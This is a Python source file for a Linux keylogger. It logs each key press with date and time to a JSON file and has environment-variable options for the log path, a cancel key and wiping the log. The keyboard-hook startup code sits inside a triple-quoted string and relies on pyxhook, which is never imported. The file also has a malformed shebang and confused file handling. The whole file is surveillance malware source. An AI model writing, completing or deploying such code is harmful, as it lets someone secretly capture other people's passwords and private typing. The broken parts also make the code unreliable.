#!usr/bin/env python
# Python code for keylogger
# to be used in linux 
import os
from datetime import date , datetime
import json

# This tells the keylogger where the log file will go. 
# You can set the file path as an environment variable ('pylogger_file'), 
# or use the default ~/Desktop/file.log 

log_file = os.environ.get(
    'pylogger_file',
    os.path.expanduser('~/Desktop/logi.json')
)
# Allow setting the cancel key from environment args, Default: `
cancel_key = ord(
    os.environ.get(
        'pylogger_cancel',
        '`'
    )[0]
)

# Allow clearing the log file on start, if pylogger_clean is defined. 
if os.environ.get('pylogger_clean', None) is not None:
    try:
        os.remove(log_file)
    except EnvironmentError:
        # File does not exist, or no permissions. 
        pass


# creating key pressing event and saving it into log file 
def OnKeyPress(event):
    y=[]
    if not os.path.isfile(log_file):
        with open(log_file, 'w') as f:
            f.write(json.dumps([]))
    with open(log_file, 'a') as f:
        a = []
        x = {"Date": date.today().strftime("%d/%m/%y"), "Time": datetime.now().strftime("%H:%M:%S"), "Value": event.Key}
        if not os.path.isfile(log_file):
            a.append(x)
            with open(log_file, mode='w') as f:
                f.write(json.dumps(a, indent=2))
        else:
            with open(log_file) as feedsjson:
                feeds = json.load(feedsjson)

            feeds.append(x)
            with open(log_file, mode='w') as f:
                f.write(json.dumps(feeds, indent=2))

    # create a hook manager object 
def deleteFile():
    if os.path.exists(log_file):
        os.remove(log_file)
    else:
        raise FileExistsError
'''
new_hook = pyxhook.HookManager()
new_hook.KeyDown = OnKeyPress
# set the hook 
new_hook.HookKeyboard()
try:
    new_hook.start()  # start the hook 
except KeyboardInterrupt:
    # User cancelled from command line. 
    pass
except Exception as ex:
    # Write exceptions to the log file, for analysis later. 
    msg = 'Error while catching events:\n  {}'.format(ex)
    pyxhook.print_err(msg)
    with open(log_file, 'a') as f:
        f.write('\n{}'.format(msg))'''